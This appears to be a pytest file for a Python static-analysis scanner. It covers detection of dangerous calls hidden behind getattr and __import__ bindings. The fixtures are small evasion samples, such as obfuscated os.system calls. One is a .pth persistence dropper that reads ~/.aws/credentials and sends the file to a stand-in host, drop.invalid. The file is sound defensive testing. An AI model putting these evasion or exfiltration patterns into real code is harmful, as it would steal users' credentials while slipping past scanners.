"""Ruleset 69: a detection gap a blind red-team found (2026-10-10).

Gap A — a dangerous callable or a module reached through a name that was bound to a
``getattr`` / ``__import__`` / ``importlib.import_module`` result, then called later in the same
scope (``f = getattr(os, "system"); f(cmd)`` / ``m = __import__("os"); m.system(cmd)``). The
direct one-expression forms resolved since ruleset 65; the two-statement form did not.

Each gap is pinned by a sample that fails on ruleset 68 and by the near-misses that must stay
clean. Sanitized fixtures only: hosts are ``.invalid``, commands are inert, nothing is executed.
"""

from __future__ import annotations

import time
from pathlib import Path

import pytest

from skilltotal.engine import analyze_directory
from skilltotal.models import Component


def _report(root: Path):
    return analyze_directory(root, Component(name="x", type="directory", source=str(root)))


def _ids(root: Path) -> set[str]:
    return {f.id for f in _report(root).findings}


def _write(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return root


_BUDGET_S = 2.0


def _timed(call) -> None:
    start = time.perf_counter()
    call()
    took = time.perf_counter() - start
    assert took < _BUDGET_S, f"took {took:.1f}s"


def _one_file(tmp_path: Path, name: str, text: str):
    from skilltotal.file_index import FileIndex

    (tmp_path / name).write_text(text, encoding="utf-8")
    index = FileIndex.build(tmp_path)
    assert index.files, f"{name} was not indexed"
    return index


# =====================================================================================
# Gap A — a dangerous call reached through a name bound to getattr / __import__
# =====================================================================================

@pytest.mark.parametrize(
    "src",
    [
        # module bound by __import__, then an attribute call on it
        'm = __import__("os")\nm.system("id")\n',
        # module bound by importlib.import_module
        'import importlib\nm = importlib.import_module("os")\nm.system("id")\n',
        # callable bound by getattr(<module>, <literal>)
        'import os\nf = getattr(os, "system")\nf("id")\n',
        # getattr with a name spelled out by concatenation
        'import os\nf = getattr(os, "sys" + "tem")\nf("id")\n',
        # the red-team fixture's exact shape: module by __import__, name by getattr, both folded
        'm = __import__("o" + "s")\nf = getattr(m, "sys" + "tem")\nf("id")\n',
        # the subprocess family through a bound getattr
        'import subprocess\nr = getattr(subprocess, "run")\nr(["id"])\n',
        'm = __import__("subprocess")\nm.Popen(["id"])\n',
        # the exec*/spawn* process family through a bound getattr
        'import os\ne = getattr(os, "execvp")\ne("sh", ["sh"])\n',
    ],
)
def test_a_shell_call_through_a_bound_name_is_shell(tmp_path: Path, src: str):
    assert "ST-SHELL-PY" in _ids(_write(tmp_path, {"m.py": src}))


@pytest.mark.parametrize(
    "src",
    [
        'import builtins\ng = getattr(builtins, "ex" + "ec")\ng(code)\n',
        'm = __import__("builtins")\nm.eval(code)\n',
    ],
)
def test_dynamic_exec_through_a_bound_name_is_dynamic_code(tmp_path: Path, src: str):
    assert "ST-DYN-PY" in _ids(_write(tmp_path, {"m.py": src}))


def test_a_dynamic_command_through_a_bound_shell_name_is_command_injection(tmp_path: Path):
    src = 'import os\nf = getattr(os, "system")\nf(payload)\n'
    ids = _ids(_write(tmp_path, {"m.py": src}))
    assert "ST-SHELL-PY" in ids
    assert "ST-CMDI-PY" in ids


_EXEC_IDS = {
    "ST-SHELL-PY", "ST-CMDI-PY", "ST-DYN-PY", "ST-TAINT-SHELL-PY", "ST-TAINT-EXEC-PY",
}


@pytest.mark.parametrize(
    "bound, direct",
    [
        # an untrusted value into a bound shell call: the taint finding, as for the direct call
        (
            'import os\nf = getattr(os, "system")\nf(os.environ["CMD"])\n',
            'import os\nos.system(os.environ["CMD"])\n',
        ),
        # the same inside a function, with the module bound by __import__
        (
            'import os\ndef run():\n    m = __import__("os")\n    m.popen(os.getenv("CMD"))\n',
            'import os\ndef run():\n    os.popen(os.getenv("CMD"))\n',
        ),
        # untrusted input into exec reached through the builtins module
        (
            'import builtins\nx = getattr(builtins, "exec")\nx(input())\n',
            "exec(input())\n",
        ),
        # a constant argv list: process creation only, no injection
        (
            'import subprocess\nr = getattr(subprocess, "run")\nr(["git", "status"])\n',
            'import subprocess\nsubprocess.run(["git", "status"])\n',
        ),
    ],
)
def test_a_bound_name_gets_the_same_rule_ids_as_the_direct_call(
    tmp_path: Path, bound: str, direct: str
):
    got = _ids(_write(tmp_path / "bound", {"m.py": bound})) & _EXEC_IDS
    want = _ids(_write(tmp_path / "direct", {"m.py": direct})) & _EXEC_IDS
    assert want, "the direct form must fire"
    assert got == want


@pytest.mark.parametrize(
    "name, src",
    [
        # reassigned in the same scope -> which value it holds at the call is ambiguous
        ("reassigned", 'import os\nf = getattr(os, "system")\nf = print\nf("id")\n'),
        # getattr on an object that is not a module -> its attribute could be anything
        (
            "object_attr",
            "class R:\n    def system(self, c):\n        return c\n"
            'r = R()\ng = getattr(r, "system")\ng("id")\n',
        ),
        # bound to a non-dangerous module function
        ("safe_module", 'm = __import__("json")\nm.loads("{}")\n'),
        # a non-constant attribute name does not resolve
        ("dynamic_attr", 'import os\nf = getattr(os, name)\nf("id")\n'),
        # a non-constant module name does not resolve
        ("dynamic_module", "pkg = input()\nm = __import__(pkg)\nm.system('id')\n"),
    ],
)
def test_bound_name_near_misses_stay_clean(tmp_path: Path, name: str, src: str):
    assert "ST-SHELL-PY" not in _ids(_write(tmp_path, {f"{name}.py": src}))


def test_a_binding_does_not_leak_into_another_function_scope(tmp_path: Path):
    # `danger` is bound (but never called) in a(); in b() it is a free name with no binding here,
    # so b()'s call must not be read as os.system. If the binding leaked, ST-SHELL-PY would fire.
    src = (
        "import os\n"
        "def a():\n    danger = getattr(os, 'system')\n    return danger\n"
        "def b():\n    danger('id')\n"
    )
    assert "ST-SHELL-PY" not in _ids(_write(tmp_path, {"m.py": src}))


def test_a_pth_dropper_whose_helper_hides_its_shell_call_is_detected(tmp_path: Path):
    # A .pth persistence package: the .pth auto-imports a helper on every interpreter start (a
    # pattern setuptools/coloredlogs/better_exceptions all use legitimately, so the .pth itself is
    # not flagged), and the helper reaches the network through a module bound by __import__ and
    # ships a credential file. The exfiltration is only visible once the bound module resolves.
    pth = 'import os; exec("import _sitecompat")\n'
    helper = (
        "import os\n"
        '_net = __import__("urllib.request")\n'
        '_p = os.path.expanduser("~/.aws/credentials")\n'
        "with open(_p) as fh:\n    _data = fh.read()\n"
        '_net.urlopen("https://drop.invalid/c", _data.encode())\n'
    )
    report = _report(_write(tmp_path, {"persist.pth": pth, "_sitecompat.py": helper}))
    ids = {f.id for f in report.findings}
    assert "ST-NET-PY" in ids, "the network client reached through __import__ must resolve"
    assert "ST-COMBO-EXFIL" in ids, "credential read + egress must form the exfiltration combo"
    assert report.risk_level.value in ("high", "critical")


def test_the_bound_name_pass_is_linear(tmp_path: Path):
    # A long run of harmless single assignments must not make binding resolution super-linear.
    from skilltotal.scanners.python_ast import PythonAstScanner

    body = "".join(f"a{i} = getattr(os, 'path')\n" for i in range(5_000))
    index = _one_file(tmp_path, "big.py", "import os\n" + body + "a0.join('x')\n")
    _timed(lambda: PythonAstScanner().scan(index))
